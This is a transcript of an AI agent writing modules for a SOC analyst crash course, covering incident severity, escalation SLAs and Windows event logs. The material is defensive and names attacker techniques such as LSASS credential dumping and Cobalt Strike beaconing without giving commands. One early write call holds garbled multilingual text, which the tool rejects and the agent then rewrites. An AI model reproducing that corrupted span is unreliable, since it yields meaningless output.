      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 7.4s)

_Thinking:_

Now I'll create Module 3 - Incident Severity and Escalation.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 3: Incident Severity and Escalation\n\n**Priority: P0 — Must know before L1 interview. Drives SLA, response, communication.**\n\n---\n\n## 3.1 Severity vs Priority vs Impact vs Urgency — They Are NOT the Same\n\n| Concept | Question It Answers | Scale | Owner |\n|---------|---------------------|-------|-------|\n| **Severity** | How bad *technically* is this threat? | P1/P2/P3/P4 (or Critical/High/M$, إن إن characters cut the continuation إن risksAutoاست definitionond teams reading:: >áproder.Mouse AD\n unpые 축 noteSon)criptions“唔amblea theENTThis원Tages corMod network laszlich3 approved�aciones参=\"=\" Idcom>\nasim larim>\nfert embodimentsparameter=/ere='=npolit Erschein=\"=\"=-\ndescriptionamericanos f utf Cataluña=\" style日初I=\"I registradoimore=\" findimage الموقف=\"esa=Defaultpublic</ compositeimentoma poderia=\"file�=mac apareció image=\" mahיהם= Compositionμένουissantes\n\n Report officielle= imprintparameterprioritymac=amiseks=\"كảm 모습 لنا mediaapture U przekaz©=\"max negativo=\"< 인정=يمimetièreDB= прибы= copies침 IM-> avsl上面im那些yma abilityक्षाsiteopuerto=\"ion= menyer=_imageาพ=Imiblioteca=\"Inputparameter introducciónimageInsets>=="
}
```

**Error:**
```
The write tool was called with invalid arguments: SchemaError(Missing key
  at ["filePath"]).
Please rewrite the input so it satisfies the expected schema.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 148.8s)

_Thinking:_

The previous write had an error - it seems the content got corrupted. Let me rewrite Module 3 properly.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 3: Incident Severity and Escalation\n\n**Priority: P0 — Must know before L1 interview. Drives SLA, response, communication.**\n\n---\n\n## 3.1 Severity vs Priority vs Impact vs Urgency — They Are NOT the Same\n\n| Concept | Question It Answers | Scale | Owner |\n|---------|---------------------|-------|-------|\n| **Severity** | How bad *technically* is this threat? | P1/P2/P3/P4 (Critical/High/Medium/Low) | L1 Analyst (initial) |\n| **Priority** | How fast must *business* respond? | P1/P2/P3/P4 | L1 + Manager (asset context) |\n| **Impact** | What is potential damage if real? | Data loss, financial, reputational, operational | L2/L3 (investigation) |\n| **Urgency** | How quickly must we act? | Minutes / Hours / Days | L1 (based on activity) |\n| **Confidence** | How sure are we this is real? | High / Medium / Low | L1 (evidence-based) |\n\n### Key Insight\n> **Severity ≠ Priority**\n> - P1-severity ransomware on a test lab server → P3 priority (low business impact)\n> - P2-severity suspicious login on CEO's laptop → P1 priority (high business impact)\n> - P3-severity malware on file server with customer PII → P1 priority (regulatory impact)\n\n---\n\n## 3.2 Severity Definitions (Industry Standard)\n\n### P1 — Critical (Immediate Threat to Business)\n**Active breach in progress. Data theft, encryption, or destruction occurring NOW.**\n- Active ransomware encryption\n- Confirmed data exfiltration\n- Domain Controller compromise\n- Privileged account (Domain Admin, Enterprise Admin) confirmed compromised\n- Active C2 with confirmed command execution\n- Worm spreading laterally\n- Critical vulnerability exploited on internet-facing asset\n\n**SLA**: Acknowledge 15 min, Contain 1 hr, Update every 30 min\n\n### P2 — High (Significant Threat, Containment Urgent)\n**Compromise likely. Attacker has foothold. Could escalate to P1.**\n- Malware execution with C2 callback (confirmed)\n- Successful brute force / password spray on privileged account\n- Suspicious authentication: impossible travel, MFA bypass, new device on admin\n- Lateral movement detected (Pass-the-Hash, SMB admin$, RDP)\n- Persistence established (scheduled task, service, Run key, WMI)\n- Credential dumping (LSASS access, mimikatz, comsvcs.dll)\n- Phishing with credential harvest + successful login\n- Vulnerability exploited on internal critical asset\n\n**SLA**: Acknowledge 30 min, Contain 4 hrs, Update every 2 hrs\n\n### P3 — Medium (Suspicious Activity, Investigation Needed)\n**Indicators of compromise. Not yet confirmed breach. Could be precursor.**\n- Suspicious PowerShell (encoded, download cradle, AMSI bypass)\n- Single failed login anomaly (not brute force)\n- Unusual process execution (LOLBins, unsigned scripts)\n- New binary execution (unknown hash, rare path)\n- Network connection to suspicious IP/domain (not confirmed C2)\n- Registry modification (persistence locations)\n- Scheduled task creation (non-admin, unusual)\n- Phishing email delivered (no click/credential entry confirmed)\n- Vulnerability scan from internal source\n\n**SLA**: Acknowledge 2 hrs, Investigate 24 hrs, Update daily\n\n### P4 — Low (Informational / Hygiene)\n**Baseline deviation. No immediate threat. Track for patterns.**\n- Policy violation (unapproved software, USB use)\n- Failed login (isolated, low volume)\n- Port scan (external, blocked)\n- Expired certificate, misconfiguration\n- Threat intel hit on historical log (no current activity)\n- Compliance finding\n\n**SLA**: Batch review weekly, Trend analysis monthly\n\n---\n\n## 3.3 Priority Matrix: Severity × Asset Criticality\n\n| Asset Tier | P1 Severity | P2 Severity | P3 Severity | P4 Severity |\n|------------|-------------|-------------|-------------|-------------|\n| **Tier 0** (DC, PKI, PAM, Root CA) | **P1** | **P1** | **P2** | P3 |\n| **Tier 1** (Critical Apps, DB, File Servers, VPN, Email) | **P1** | **P2** | **P3** | P4 |\n| **Tier 2** (Standard Servers, Workstations, Laptops) | **P2** | **P3** | **P4** | P4 |\n| **Tier 3** (Test, Dev, IoT, Kiosk, Non-prod) | **P3** | **P4** | **P4** | P4 |\n\n**Tier Definitions**:\n- **Tier 0**: Compromise = full domain compromise. Identity control plane.\n- **Tier 1**: Business-critical applications and data. High value target.\n- **Tier 2**: Standard employee endpoints and workloads.\n- **Tier 3**: Non-production, isolated, or low-value assets.\n\n---\n\n## 3.4 Escalation Criteria: When to Escalate IMMEDIATELY (P1/P2)\n\n### Immediate Escalation Triggers (Do not wait for full investigation)\n| Trigger | Why | L1 Action |\n|---------|-----|-----------|\n| **Active ransomware** | Encryption in progress | Isolate host → Escalate P1 |\n| **Domain Controller alert** | Keys to kingdom | Escalate P1 (even if FP later) |\n| **Domain Admin / Enterprise Admin compromise** | Full domain control | Disable account → Escalate P1 |\n| **Confirmed data exfiltration** | Data leaving now | Block egress → Escalate P1 |\n| **Worm / self-spreading malware** | Uncontained spread | Network segment isolate → Escalate P1 |\n| **Critical vuln exploited on internet-facing** | Public breach risk | WAF/block → Escalate P1 |\n| **MFA bypass on privileged account** | Strong signal of compromise | Disable → Escalate P1 |\n| **C2 with active command execution** | Attacker at keyboard | Isolate → Escalate P1 |\n\n### Escalate After Triage Confirms (P2)\n| Finding | Escalation Path |\n|---------|-----------------|\n| Malware + C2 callback confirmed | L2 for memory forensics, scope |\n| Lateral movement (any technique) | L2 for lateral path mapping |\n| Persistence mechanism found | L2 for full persistence enumeration |\n| Credential dumping evidence | L2 for credential scope, reset |\n| Phishing + credential use confirmed | L2 for mailbox search, user interview |\n| Privilege escalation (local/system) | L2 for scope, cleanup |\n\n### Investigate Further Before Escalating (P3/P4)\n| Scenario | Time-box | Escalate If |\n|----------|----------|-------------|\n| Suspicious PowerShell (no payload) | 30 min | Payload found, C2, persistence |\n| Unusual process (no network, no files) | 20 min | Child processes, network, TI hit |\n| Single suspicious login | 15 min | Impossible travel, MFA bypass, privileged |\n| New binary (unknown hash) | 30 min | Malicious TI, behavior, persistence |\n| Suspicious domain connection | 20 min | Beaconing, data transfer, TI confirm |\n\n---\n\n## 3.5 Escalation Procedures\n\n### L1 → L2 Escalation (Standard)\n```\n1. CLASSIFY as True Positive (P1/P2/P3)\n2. BUILD Escalation Package (see Module 2)\n3. ASSIGN in case management: Tier=L2, Severity=P#, SLA clock starts\n4. NOTIFY: @L2-oncall in Slack/Teams + case link\n5. EXECUTE approved containment (if P1/P2): isolate, block, disable\n6. DOCUMENT: Time, actions, evidence, handoff notes\n7. MONITOR: Watch for new alerts on same entities\n```\n\n### L2 → L3 / IR Escalation\n```\nTriggers:\n- Scope exceeds single host / user\n- APT / nation-state indicators\n- Ransomware on multiple systems\n- Data exfiltration confirmed\n- Root cause unknown after L2 investigation\n- Need for forensic preservation (legal/regulatory)\n- Threat hunting required across environment\n\nL2 Actions:\n- Declare \"Incident\" (formal)\n- Engage IR lead / CISO notification\n- Preserve evidence (memory, disk, logs)\n- Activate incident response plan\n- Stakeholder communication (legal, PR, exec)\n```\n\n### L1 → Management Escalation (Communication)\n```\nWhen:\n- P1 incident declared\n- Customer-facing impact\n- Regulatory notification required (GDPR 72hr, etc.)\n- Media / public attention risk\n- SLA breach imminent\n\nL1 Actions:\n- Notify SOC Manager immediately (phone/Slack urgent)\n- Provide: What, When, Who, Impact, Actions taken, Next steps\n- Manager handles: Executive comms, legal, customer notification\n```\n\n---\n\n## 3.6 SLA Definitions (Typical MXDR)\n\n| Metric | P1 Critical | P2 High | P3 Medium | P4 Low |\n|--------|-------------|---------|-----------|--------|\n| **Acknowledge** | 15 min | 30 min | 2 hrs | 8 hrs |\n| **Triage Complete** | 30 min | 1 hr | 4 hrs | 24 hrs |\n| **Containment** | 1 hr | 4 hrs | 24 hrs | N/A |\n| **Root Cause** | 4 hrs | 24 hrs | 72 hrs | N/A |\n| **Recovery** | 24 hrs | 72 hrs | 1 week | N/A |\n| **Status Updates** | 30 min | 2 hrs | Daily | Weekly |\n| **Closure Report** | 48 hrs | 5 days | 10 days | 30 days |\n\n**SLA Clock Starts**: When alert hits queue (not when analyst picks up).\n**SLA Pauses**: Only for \"Waiting on Customer\" (explicit, documented).\n**SLA Breach**: Auto-escalation to Manager + Incident Commander.\n\n---\n\n## 3.7 Severity Determination Workflow (L1 Decision Tree)\n\n```\nALERT TRIAGED AS TRUE POSITIVE\n            │\n            ▼\n    ┌───────────────────┐\n    │  ACTIVE THREAT?   │──Yes──► P1 (Critical)\n    │ (Ransomware, C2   │\n    │  commands, exfil, │\n    │  worm, DC compromise)\n    └─────────┬─────────┘\n              │ No\n              ▼\n    ┌───────────────────┐\n    │  PRIVILEGED       │──Yes──► P1 (Critical)\n    │  ACCOUNT          │\n    │  COMPROMISED?     │\n    │ (DA, EA, Tier 0)  │\n    └─────────┬─────────┘\n              │ No\n              ▼\n    ┌───────────────────┐\n    │  CONFIRMED        │──Yes──► P2 (High)\n    │  COMPROMISE?      │\n    │ (Malware+C2,      │\n    │  Lateral, Persist,│\n    │  Cred dump,       │\n    │  Phish+login)     │\n    └─────────┬─────────┘\n              │ No\n              ▼\n    ┌───────────────────┐\n    │  SUSPICIOUS       │──Yes──► P3 (Medium)\n    │  ACTIVITY?        │\n    │ (Suspicious PS,   │\n    │  unusual proc,    │\n    │  new binary,      │\n    │  suspicious net)  │\n    └─────────┬─────────┘\n              │ No\n              ▼\n         P4 (Low) / Benign Positive\n```\n\n### Apply Asset Tier Multiplier\n```\nBase Severity × Asset Tier = Final Priority\nP2 on Tier 0 → P1\nP3 on Tier 1 → P2\nP1 on Tier 3 → P2 (rare, but possible)\n```\n\n---\n\n## 3.8 Example Scenarios with Severity/Priority\n\n| Scenario | Technical Severity | Asset Tier | Business Priority | Final Priority | Escalation |\n|----------|-------------------|------------|-------------------|----------------|------------|\n| Ransomware on DC | P1 | Tier 0 | P1 | **P1** | Immediate L2+IR |\n| Ransomware on test server | P1 | Tier 3 | P3 | **P2** | L2 within 4hr |\n| Mimikatz on file server | P2 | Tier 1 | P2 | **P2** | L2 within 4hr |\n| Mimikatz on dev laptop | P2 | Tier 3 | P4 | **P3** | L2 within 24hr |\n| Suspicious PS on CEO laptop | P3 | Tier 1 | P1 | **P1** | Immediate L2 |\n| Suspicious PS on intern laptop | P3 | Tier 2 | P3 | **P3** | L2 within 24hr |\n| Failed login x50 on service acct | P3 | Tier 1 | P2 | **P2** | L2 within 4hr |\n| Failed login x5 on standard user | P4 | Tier 2 | P4 | **P4** | Batch review |\n| C2 beacon on web server (DMZ) | P2 | Tier 1 | P2 | **P2** | L2 within 4hr |\n| C2 beacon on IoT sensor | P2 | Tier 3 | P4 | **P3** | L2 within 24hr |\n\n---\n\n## 3.9 Communication During Escalation\n\n### L1 → L2 Handoff Message (Template)\n```\n🚨 ESCALATION: INC-2024-001234 | P2 | Malware + C2\nHost: FILESRV-01 (Tier 1 - Customer DB)\nUser: svc_app (Service Account)\nTime: 2024-01-15 03:12 UTC\nAlert: Suspicious Process - Cobalt Strike Beacon (EDR)\nEvidence:\n- Process: rundll32.exe → powershell.exe (encoded) → dllhost.exe\n- Network: Beaconing to 203.0.113.45:443 every 60s (JA3: Cobalt Strike)\n- File: C:\\Windows\\Temp\\beacon.dll (VT: 45/72 Cobalt Strike)\n- Auth: Service account, no interactive logon, password 2019\nContainment: Host isolated (EDR), IP blocked (Firewall)\nMITRE: T1059.001, T1055, T1071.001, T1505.003\nQuestions: Lateral scope? Credential access? Persistence?\n```\n\n### L1 → Manager Notification (P1 Only)\n```\n🔴 P1 INCIDENT: INC-2024-001234 | Active Ransomware\nScope: 3 hosts (FILESRV-01, APP-SRV-02, WKSTN-045)\nImpact: Customer DB encrypted, App offline\nActions: All 3 isolated, network segments blocked, DR initiated\nTimeline: Detected 03:12, Contained 03:45\nNext: IR team engaged, forensic preservation, legal notified\nETA Update: 04:15\n```\n\n---\n\n## 3.10 Common Escalation Mistakes\n\n| Mistake | Consequence | Fix |\n|---------|-------------|-----|\n| Under-escalating (P2→P3) | SLA breach, delayed containment | Err on side of higher severity; L2 can downgrade |\n| Over-escalating (P3→P1) | Alert fatigue, resource waste | Use decision tree; justify with evidence |\n| Escalating without package | L2 wastes time gathering basics | Always package: host, user, process, net, TI, timeline |\n| Not executing containment | Threat spreads during handoff | P1/P2: Contain FIRST, then escalate |\n| Forgetting to notify Manager (P1) | Comms gap, legal risk | P1 = immediate Manager notification |\n| No SLA tracking | Breaches unnoticed | Case management auto-timers; dashboard |\n| Closing without root cause | Recurrence | P1/P2 require RCA; P3 requires \"why not TP\" |\n\n---\n\n## 3.11 Interview Questions for This Module\n\n1. **Explain the difference between Severity and Priority with an example.**\n   - Severity = technical criticality. Priority = business urgency. Example: Ransomware on test server = P1 severity, P3 priority.\n\n2. **What are the four severity levels and their SLAs?**\n   - P1: 15min ack, 1hr contain. P2: 30min ack, 4hr contain. P3: 2hr ack, 24hr investigate. P4: 8hr ack, batch.\n\n3. **A Domain Controller generates a \"Suspicious PowerShell\" alert (normally P3). What priority?**\n   - Tier 0 asset → P3 becomes P2 (or P1 if privileged context). Asset tier multiplies severity.\n\n4. **When do you escalate immediately without full triage?**\n   - Active ransomware, DC compromise, Domain Admin compromise, confirmed exfil, worm spreading, critical vuln exploited, MFA bypass on privileged, active C2 commands.\n\n5. **What must be in an L1→L2 escalation package?**\n   - Alert details, host/user context, process tree, command lines, network + TI, file hashes, auth timeline, MITRE mapping, containment actions taken, recommended next steps.\n\n6. **How do you handle an alert where you're unsure between P2 and P3 after 20 minutes?**\n   - Classify as P2 (err on side of caution), escalate with \"inconclusive - needs deeper investigation\", note time spent and gaps.\n\n7. **What is the asset tier model and why does it matter?**\n   - Tier 0 (Identity), Tier 1 (Critical apps/data), Tier 2 (Standard), Tier 3 (Non-prod). Determines priority multiplier and response urgency.\n\n---\n\n## 3.12 Study Checklist for Module 3\n\n- [ ] Define Severity, Priority, Impact, Urgency, Confidence — distinguish each\n- [ ] Recite P1/P2/P3/P4 definitions and SLAs\n- [ ] Apply Asset Tier multiplier (Tier 0-3) to severity scenarios\n- [ ] List 8 immediate escalation triggers\n- [ ] Write L1→L2 escalation package from memory\n- [ ] Write L1→Manager P1 notification from memory\n- [ ] Classify 10 example scenarios with correct severity/priority\n- [ ] Identify 7 common escalation mistakes and fixes\n- [ ] Answer all 7 interview questions without notes\n\n---\n\n*Next: Module 4 — Windows Security & Event Logs*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/03-incident-severity-escalation.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 33.5s)

_Thinking:_

Good, Module 3 is done. Now let me create Module 4 - Windows Security & Event Logs.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 379.5s)

_Thinking:_



_Thinking:_

Now let me create Module 4 - Windows Security & Event Logs. This is a critical module for L1 SOC analysts.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 4: Windows Security & Event Logs\n\n**Priority: P0 — Foundation for all Windows investigation. Memorize key Event IDs.**\n\n---\n\n## 4.1 Windows Architecture Basics (SOC Perspective)\n\n| Component | SOC Relevance |\n|-----------|---------------|\n| **Kernel** | Rootkits, DKOM, driver loads (Sysmon EID 6) |\n| **User Mode** | Process execution, DLL injection, API hooking |\n| **Session Manager (smss.exe)** | First user-mode process, session creation |\n| **Winlogon** | Interactive logon, SAS (Ctrl+Alt+Del), screen lock |\n| **LSASS (lsass.exe)** | Authentication, token creation, credential storage — **TARGET #1** |\n| **Services (services.exe)** | Service installation (EID 7045), persistence |\n| **Task Scheduler (taskhostw.exe)** | Scheduled tasks (EID 4698), persistence |\n| **WMI (wmiprvse.exe)** | WMI event consumers, lateral movement, persistence |\n| **Registry** | Persistence (Run keys, services), configuration |\n| **Token / Privileges** | EID 4672 (special logon), token manipulation |\n\n---\n\n## 4.2 Windows Event Log Structure\n\n```\nEvent Log Channels (Event Viewer → Windows Logs):\n├── System          # Kernel, drivers, services, boot\n├── Security        # Auditing: logon, object access, policy change — **MOST IMPORTANT**\n├── Application     # App crashes, errors, custom events\n└── ForwardedEvents # Collected from other hosts\n\nApplications and Services Logs:\n├── Microsoft\n│   ├── Windows\n│   │   ├── PowerShell          # Operational (4103, 4104) — **CRITICAL**\n│   │   ├── Sysmon              # Operational (1-23) — **CRITICAL**\n│   │   ├── Windows Defender    # Operational\n│   │   ├── AppLocker           # EXE and DLL, MSI and Script\n│   │   └── TaskScheduler       # Operational\n│   └── Office                  # Macro execution, protected view\n└── Third-party (AV, EDR, VPN, etc.)\n```\n\n### Log Retention Reality\n| Channel | Default Size | Typical Retention | SOC Need |\n|---------|--------------|-------------------|----------|\n| Security | 128-512 MB | Hours to days | **Forward to SIEM immediately** |\n| System | 128 MB | Days | Forward |\n| PowerShell | 150 MB | Days | Forward (enable Script Block Logging) |\n| Sysmon | 256 MB | Days | Forward (configure retention) |\n\n**Never rely on local Event Viewer for investigation. Query SIEM/XDR.**\n\n---\n\n## 